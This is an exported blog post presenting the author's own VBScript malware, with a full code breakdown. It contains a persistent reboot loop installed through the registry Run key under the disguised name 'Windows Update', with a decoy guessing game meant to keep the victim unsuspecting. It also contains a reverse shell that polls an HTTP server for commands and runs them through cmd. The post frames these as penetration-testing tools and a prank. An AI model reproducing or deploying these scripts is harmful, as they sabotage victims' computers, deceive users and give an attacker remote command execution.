<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Fun with VBScript malware</title><style>
      * {
        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
      }
      html, body {
        margin: 0;
        padding: 0;
      }
      h1 {
        font-size: 50px;
        margin-bottom: 17px;
        color: #333;
      }
      h2 {
        font-size: 24px;
        line-height: 1.6;
        margin: 30px 0 0 0;
        margin-bottom: 18px;
        margin-top: 33px;
        color: #333;
      }
      h3 {
        font-size: 30px;
        margin: 10px 0 20px 0;
        color: #333;
      }
      header {
        width: 640px;
        margin: auto;
      }
      section {
        width: 640px;
        margin: auto;
      }
      section p {
        margin-bottom: 27px;
        font-size: 20px;
        line-height: 1.6;
        color: #333;
      }
      section img {
        max-width: 640px;
      }
      footer {
        padding: 0 20px;
        margin: 50px 0;
        text-align: center;
        font-size: 12px;
      }
      .aspectRatioPlaceholder {
        max-width: auto !important;
        max-height: auto !important;
      }
      .aspectRatioPlaceholder-fill {
        padding-bottom: 0 !important;
      }
      header,
      section[data-field=subtitle],
      section[data-field=description] {
        display: none;
      }
      </style></head><body><article class="h-entry">
<header>
<h1 class="p-name">Fun with VBScript malware</h1>
</header>
<section data-field="subtitle" class="p-summary">
An infinite reboot script and a (somewhat buggy) reverse shell
</section>
<section data-field="body" class="e-content">
<section name="d2b7" class="section section--body section--first section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="beaa" id="beaa" class="graf graf--h3 graf--leading graf--title">Fun with VBScript malware</h3><h4 name="ce13" id="ce13" class="graf graf--h4 graf-after--h3 graf--subtitle">An infinite reboot script and a (somewhat buggy) reverse shell</h4><figure name="28d8" id="28d8" class="graf graf--figure graf-after--h4"><img class="graf-image" data-image-id="1*keWY9l0gNLkYXKHVm-DDsQ.png" data-width="1920" data-height="1080" data-is-featured="true" src="https://cdn-images-1.medium.com/max/800/1*keWY9l0gNLkYXKHVm-DDsQ.png"></figure><h3 name="a418" id="a418" class="graf graf--h3 graf-after--figure">Contents at a glance</h3><ol class="postList"><li name="cdb8" id="cdb8" class="graf graf--li graf-after--h3">Introduction</li><li name="adbb" id="adbb" class="graf graf--li graf-after--li">Infinite rebooting</li><li name="8ac5" id="8ac5" class="graf graf--li graf-after--li">Reverse shell</li><li name="33c3" id="33c3" class="graf graf--li graf-after--li">Final thoughts</li><li name="103d" id="103d" class="graf graf--li graf-after--li">Acknowledgments</li><li name="bc95" id="bc95" class="graf graf--li graf-after--li">Works cited</li></ol><h3 name="c30e" id="c30e" class="graf graf--h3 graf-after--li">Introduction</h3><p name="5046" id="5046" class="graf graf--p graf--hasDropCapModel graf--hasDropCap graf-after--h3"><span class="graf-dropCap">T</span>he <em class="markup--em markup--p-em">Visual Basic Scripting</em> (VBScript) language is a fairly old interpreted language that is a subset of Microsoft’s Visual Basic language. It is mainly used for automating system administration tasks, but it can also be repurposed for malware purposes. In fact, the well-known (in)famous LOVELETTER virus was written in VBScript (<a href="http://virus.wikidot.com/loveletter" data-href="http://virus.wikidot.com/loveletter" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Virus Encyclopedia, n.d.</a>).</p><p name="ea8c" id="ea8c" class="graf graf--p graf-after--p">Here, I am going to discuss a couple of VBScript malware tools that I wrote, and hopefully these can be used as a “springboard” for other penetration testers and security researchers to develop their tools.</p><h3 name="841a" id="841a" class="graf graf--h3 graf-after--p">Infinite rebooting</h3><p name="1d30" id="1d30" class="graf graf--p graf-after--h3">I’ll start with a simple script that will cause a computer system to reboot upon logging in. This script will install a batch file that will reboot the computer as the user logs in, and after installation, will launch a “guess my random number” game as to prevent suspicion from the user:</p><figure name="760d" id="760d" class="graf graf--figure graf--iframe graf-after--p"><script src="https://gist.github.com/Alekseyyy/6e3569c5b3dfa5eeee60f9f48af58579?file=medium.2021.infosecw.vbscript_fun.reboot.vbs.js"></script></figure><p name="c080" id="c080" class="graf graf--p graf-after--figure">Running this script will cause the computer to reboot “forever” provided that:</p><ul class="postList"><li name="109f" id="109f" class="graf graf--li graf-after--p">The computer has a constant source of power</li><li name="31ad" id="31ad" class="graf graf--li graf-after--li">The user does not do a cold shutdown</li><li name="1d6a" id="1d6a" class="graf graf--li graf-after--li">The user does not boot into safe mode</li><li name="e4e3" id="e4e3" class="graf graf--li graf-after--li">The account that is logged into is the account that launched the above script</li></ul><p name="e3c8" id="e3c8" class="graf graf--p graf-after--li">Let’s break down the script:</p><pre name="a616" id="a616" class="graf graf--pre graf-after--p">Option Explicit <br>On Error Resume Next</pre><pre name="013c" id="013c" class="graf graf--pre graf-after--pre">Set oFileSystem = CreateObject(“Scripting.FileSystemObject”)<br>Set WshShell = CreateObject(“WScript.Shell”)</pre><p name="07b7" id="07b7" class="graf graf--p graf-after--pre">The <code class="markup--code markup--p-code">Option Explicit</code> and <code class="markup--code markup--p-code">On Error Resume Next</code> lines are just instructions for the interpreter to ignore runtime errors and other housekeeping stuff.</p><pre name="894f" id="894f" class="graf graf--pre graf-after--p">&#39; Install the reboot script</pre><pre name="22b7" id="22b7" class="graf graf--pre graf-after--pre">app_data = WshShell.ExpandEnvironmentStrings(“%APPDATA%”)<br>full_install = app_data &amp; “\winupdate.bat”</pre><pre name="836a" id="836a" class="graf graf--pre graf-after--pre">If Not oFileSystem.FileExists(full_install) Then<br>    Set reboot_script = oFileSystem.CreateTextFile(full_install)<br>    reboot_script.WriteLine(“shutdown -r -t 00”)<br>    reboot_script.Close()</pre><pre name="7230" id="7230" class="graf graf--pre graf-after--pre">WshShell.RegWrite “HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows Update”, full_install, “REG_SZ”</pre><pre name="7d06" id="7d06" class="graf graf--pre graf-after--pre">Set rs_map = oFileSystem.GetFile(full_install)<br>    rs_map.Attributes = 2</pre><pre name="12dc" id="12dc" class="graf graf--pre graf-after--pre">End If</pre><p name="4d10" id="4d10" class="graf graf--p graf-after--pre">This will install the script. First, it’ll work out the <code class="markup--code markup--p-code">AppData\Roaming</code> directory for the user in question with <code class="markup--code markup--p-code">app_data = WshShell.ExpandEnvironmentStrings(“%APPDATA%”)</code> and concat the directory with the target filename (<code class="markup--code markup--p-code">winupdate.bat</code> in my case).</p><p name="2fa5" id="2fa5" class="graf graf--p graf-after--p">Next, the script will proceed to write a batch file into the target’s <em class="markup--em markup--p-em">AppData\Roaming</em> directory if said batch file does not yet exist. The batch file will have the command <code class="markup--code markup--p-code">shutdown -r -t 00</code> written into it, which will instruct the computer to immediately reboot. It should be noted that YouTube user <a href="https://youtu.be/NaxWSf83Ft8" data-href="https://youtu.be/NaxWSf83Ft8" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">JayFilkins (2008)</a> made his own version of an “infinite” reboot script that makes use of <em class="markup--em markup--p-em">Windows Management Instrumentation</em> (WMI) as opposed to a simple use of the command line.</p><p name="6037" id="6037" class="graf graf--p graf-after--p">Finally, I wrote a little random number guessing game to keep the (hopefully unsuspecting) user ignorant of the malicious nature of my script:</p><pre name="1bd6" id="1bd6" class="graf graf--pre graf-after--p">Sub NumbersGame</pre><pre name="79b9" id="79b9" class="graf graf--pre graf-after--pre">done = False<br>    total_guesses = 0<br>    Randomize<br>    target = FormatNumber(Int((100 * Rnd) + 1))</pre><pre name="44d3" id="44d3" class="graf graf--pre graf-after--pre">Do Until done<br>        input = InputBox(“Type your guess:”, “Pick a number between 1 and 100”)<br>        total_guesses = total_guesses + 1<br>        If Len(input) &lt;&gt; 0 Then<br>            If IsNumeric(input) Then<br>                If FormatNumber(input) = target Then<br>                    MsgBox(“Yes, the random number is “ &amp; input &amp; “ and it took you “ &amp; total_guesses &amp; “ guesses to get there!”)<br>                    done = True<br>                End If<br>                If FormatNumber(input) &lt; target Then<br>                    MsgBox(“Your guess is too small”)<br>                End If<br>                If FormatNumber(input) &gt; target Then<br>                    MsgBox(“You guess is too large”)<br>                End If<br>            Else<br>                MsgBox(“Please enter in a number.”)<br>        End If<br>        Else<br>            MsgBox(“Please play again soon!”)<br>            done = True<br>        End If<br>    Loop<br>End Sub</pre><pre name="fd7b" id="fd7b" class="graf graf--pre graf-after--pre">Call NumbersGame</pre><p name="945c" id="945c" class="graf graf--p graf-after--pre">This script is a slightly modified version of the random number guessing game given by Ford (2014, ch. 6). It works by first initializing three variables:</p><ul class="postList"><li name="3d90" id="3d90" class="graf graf--li graf-after--p"><code class="markup--code markup--li-code">done = False</code> The script will be looping until the target correctly guesses the number. When the target correctly guesses the number, <code class="markup--code markup--li-code">done</code> will be set to <code class="markup--code markup--li-code">True</code>.</li><li name="01a4" id="01a4" class="graf graf--li graf-after--li"><code class="markup--code markup--li-code">total_guesses = 0</code> This will keep track on the amount of guesses that the target makes.</li><li name="99f2" id="99f2" class="graf graf--li graf-after--li"><code class="markup--code markup--li-code">target = FormatNumber(Int((100 * Rnd) + 1))</code> This will be the winning random number to the game. Note how the script uses <code class="markup--code markup--li-code">Randomize </code>statement to avoid a purely deterministic number being used.</li></ul><pre name="347c" id="347c" class="graf graf--pre graf-after--li">Do Until done<br>     input = InputBox(“Type your guess:”, “Pick a number between 1 and 100”)<br>     total_guesses = total_guesses + 1<br>     [ ... ]<br>Loop</pre><p name="9df8" id="9df8" class="graf graf--p graf-after--pre">This one is fairly straightforward: until <code class="markup--code markup--p-code">done</code> is set to <code class="markup--code markup--p-code">True</code>, the script will ask the target to input their guess for a number and increment the total number of guesses by 1.</p><pre name="f502" id="f502" class="graf graf--pre graf-after--p">If Len(input) &lt;&gt; 0 Then<br>    If IsNumeric(input) Then<br>        If FormatNumber(input) = target Then<br>            MsgBox(“Yes, the random number is “ &amp; input &amp; “ and it took you “ &amp; total_guesses &amp; “ guesses to get there!”)<br>            done = True<br>        End If<br>        If FormatNumber(input) &lt; target Then<br>            MsgBox(“Your guess is too small”)<br>        End If<br>        If FormatNumber(input) &gt; target Then<br>            MsgBox(“You guess is too large”)<br>        End If<br>    Else<br>        MsgBox(“Please enter in a number.”)<br>    End If<br>Else<br>    MsgBox(“Please play again soon!”)<br>    done = True<br>End If</pre><p name="285c" id="285c" class="graf graf--p graf-after--pre">Here, the input is checked to see if it is empty (if so, then the game will close), to see if a number is indeed a number, and then compare the input to the guess.</p><p name="dced" id="dced" class="graf graf--p graf-after--p">If the input matches the target variable, then the program will congratulate the user and end. If not, then the loop will go on until the user guesses the right number, and the script will alert the user whether on not the number is too large or too small.</p><p name="034c" id="034c" class="graf graf--p graf-after--p">This is just a small prank that can be pulled for fun, and can be easily removed by booting into <em class="markup--em markup--p-em">Windows Safe Mode</em> (usually via the F4/F5/F6/F8 keys) and deleting the <code class="markup--code markup--p-code">winupdate.bat</code> file in the <code class="markup--code markup--p-code">AppData\Roaming</code> directory and removing the “Windows Update” entry in HKCU’s Run registry key.</p><h3 name="a5d4" id="a5d4" class="graf graf--h3 graf-after--p">Reverse shell</h3><p name="4d99" id="4d99" class="graf graf--p graf-after--h3">This script is a small, basic reverse shell:</p><figure name="d65a" id="d65a" class="graf graf--figure graf--iframe graf-after--p"><script src="https://gist.github.com/Alekseyyy/6e3569c5b3dfa5eeee60f9f48af58579?file=medium.2021.infosecw.vbscript_fun.shellcode.vbs.js"></script></figure><p name="cf93" id="cf93" class="graf graf--p graf-after--figure">It installs itself into the current user’s <code class="markup--code markup--p-code">AppData\Roaming</code> directory and then looks for commands from an external HTTP server. The concept and some of the code “style” — for lack of a better term — was borrowed from <a href="http://breakpoint.purrfect.fr/article/vbs_reverse_shell.html" data-href="http://breakpoint.purrfect.fr/article/vbs_reverse_shell.html" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Picard (2018)</a> but nonetheless I did feel like I was able to make significant enough changes to call this my own distinct thing.</p><p name="b360" id="b360" class="graf graf--p graf-after--p">Like with the “infinite reboot” script, this script will install itself onto the computer. However, since the installation mechanism is very similar to my said infinite reboot script, I won’t go over it. I will just focus on the part that involved communication with the HTTP server to execute commands.</p><p name="0e66" id="0e66" class="graf graf--p graf-after--p">First, I will define a Const variable pointing to the HTTP server and its respective port, as well as a boolean variable called <code class="markup--code markup--p-code">done</code> set to <code class="markup--code markup--p-code">False</code>:</p><pre name="5a23" id="5a23" class="graf graf--pre graf-after--p">Const server = &quot;http://10.0.2.2:8000/command.txt&quot;</pre><pre name="024d" id="024d" class="graf graf--pre graf-after--pre">[ ... ]</pre><pre name="f560" id="f560" class="graf graf--pre graf-after--pre">done = False</pre><p name="43ae" id="43ae" class="graf graf--p graf-after--pre">Then I’ll setup a Do Loop</p><pre name="c710" id="c710" class="graf graf--pre graf-after--p">Do Until done<br>	[ ... ]<br>Loop</pre><p name="0945" id="0945" class="graf graf--p graf-after--pre">Inside this loop, I will connect to the HTTP server and open up a GET request for the text file with the commands to execute:</p><pre name="6be1" id="6be1" class="graf graf--pre graf-after--p">Set XMLHTTP = CreateObject(&quot;MSXML2.XMLHTTP.3.0&quot;)<br>XMLHTTP.open &quot;GET&quot;, server, False<br>XMLHTTP.send<br>command = XMLHTTP.responseText</pre><p name="d3f0" id="d3f0" class="graf graf--p graf-after--pre">After the text file of commands is gotten and stored in the <code class="markup--code markup--p-code">command</code> variable, a bit of conditional logic will be made used of to work out whether or not to exit the execution of the script, uninstall the script or execute the command:</p><pre name="bbcd" id="bbcd" class="graf graf--pre graf-after--p">If InStr(command, &quot;EXIT&quot;) Then<br>    done = True<br>End If<br>	<br>If InStr(command, &quot;REMOVE&quot;) Then<br>    WshShell.RegDelete &quot;HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows Update&quot;<br>    Set delete_me = oFileSystem.CreateTextFile(oFileSystem.GetSpecialFolder(2) &amp; &quot;\romcs.bat&quot;)<br>    delete_me.WriteLine(&quot;@echo off&quot;)<br>    delete_me.WriteLine(&quot;timeout 10&quot;)<br>    delete_me.Close()<br>		<br>    WshShell.Run oFileSystem.GetSpecialFolder(2) &amp; &quot;\romcs.bat&quot;<br>    done = True<br>Else<br>    WshShell.Run &quot;cmd /c &quot; &amp; command, 0, True<br>End If<br>	<br>WScript.Sleep(15000)</pre><p name="2b72" id="2b72" class="graf graf--p graf-after--pre">If the <code class="markup--code markup--p-code">command</code> variable has an <code class="markup--code markup--p-code">EXIT</code>, the the script will close, or if the <code class="markup--code markup--p-code">command</code> variable has a <code class="markup--code markup--p-code">REMOVE</code>, the script will try to uninstall. Otherwise, the script will run the command via <code class="markup--code markup--p-code">cmd /c &lt;command to execute&gt;</code> and the sleep for about fifteen (15) seconds.</p><p name="36ae" id="36ae" class="graf graf--p graf-after--p">Note that <em class="markup--em markup--p-em">Windows Defender</em> or some other antivirus utility might try to stop the <code class="markup--code markup--p-code">WshShell.Run</code> part of the script from executing code (as what happened with me when I was testing these scripts).</p><h3 name="bf54" id="bf54" class="graf graf--h3 graf-after--p">Final thoughts</h3><p name="7c27" id="7c27" class="graf graf--p graf-after--h3">For some of you, the commentary that I gave regarding my (fairly simple) VBScript malware may have been viewed as “child’s play” or “newbie stuff,” which is a fair criticism. This is just me experimenting with different kinds of malware tooling that can be used in penetration testing or computer network operations.</p><p name="f16c" id="f16c" class="graf graf--p graf-after--p">Keep in mind that if you do decide to use my scripts for your penetration testing projects, be sure to test them thoroughly and understand any potential weaknesses that they may have.</p><h3 name="a98b" id="a98b" class="graf graf--h3 graf-after--p">Acknowledgements</h3><p name="0beb" id="0beb" class="graf graf--p graf-after--h3">Hacker Fantastic, Agnes Driscoll, <a href="https://twitter.com/krichard1212" data-href="https://twitter.com/krichard1212" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">@krichard1212</a>, <a href="https://twitter.com/anal_sex42069" data-href="https://twitter.com/anal_sex42069" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">@anal_sex42069</a>, <a href="https://twitter.com/TheExiaRoss00" data-href="https://twitter.com/TheExiaRoss00" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">@TheExiaRoss00</a>, Amanda Rousseau, Aydin Paladin and Nassim Taleb.</p><p name="79c1" id="79c1" class="graf graf--p graf-after--p">Also I want to bring attention to Trayvon Martin, Michael Brown and George Floyd — they are victims of our racist system, and something needs to be done about said system.</p><h3 name="d7e4" id="d7e4" class="graf graf--h3 graf-after--p">Works cited</h3><p name="a759" id="a759" class="graf graf--p graf-after--h3">Ford, J. L. (2014). <em class="markup--em markup--p-em">Microsoft WSH and VBScript programming for the absolute beginner </em>(4th ed.). Mason, OH: CENGAGE Learning Custom Publishing.</p><p name="b846" id="b846" class="graf graf--p graf-after--p">JayFilkins (2008). <em class="markup--em markup--p-em">How to write VBScript Viruses / Trojan Horses</em>. YouTube. Retrieved in April 6, 2021 from: <a href="https://youtu.be/NaxWSf83Ft8" data-href="https://youtu.be/NaxWSf83Ft8" class="markup--anchor markup--p-anchor" rel="nofollow noopener noopener noopener" target="_blank">https://youtu.be/NaxWSf83Ft8</a></p><p name="fde4" id="fde4" class="graf graf--p graf-after--p">Picard, C. (2018). <em class="markup--em markup--p-em">VBS Reverse Shell</em>. Breakpoint. Retrieved in April 6, 2021 from: <a href="http://breakpoint.purrfect.fr/article/vbs_reverse_shell.html" data-href="http://breakpoint.purrfect.fr/article/vbs_reverse_shell.html" class="markup--anchor markup--p-anchor" rel="nofollow noopener noopener noopener" target="_blank">http://breakpoint.purrfect.fr/article/vbs_reverse_shell.html</a></p><p name="5587" id="5587" class="graf graf--p graf-after--p graf--trailing">Virus Encyclopedia (n.d.). <em class="markup--em markup--p-em">Loveletter</em>. Retrieved in April 6, 2021 from: <a href="http://virus.wikidot.com/loveletter" data-href="http://virus.wikidot.com/loveletter" class="markup--anchor markup--p-anchor" rel="nofollow noopener noopener noopener" target="_blank">http://virus.wikidot.com/loveletter</a></p></div></div></section>
</section>
<footer><p>By <a href="https://medium.com/@EpsilonCalculus" class="p-author h-card">Aleksey</a> on <a href="https://medium.com/p/2f5bb0d107df"><time class="dt-published" datetime="2021-04-09T07:03:43.275Z">April 9, 2021</time></a>.</p><p><a href="https://medium.com/@EpsilonCalculus/fun-with-vbscript-malware-2f5bb0d107df" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on June 14, 2022.</p></footer></article></body></html>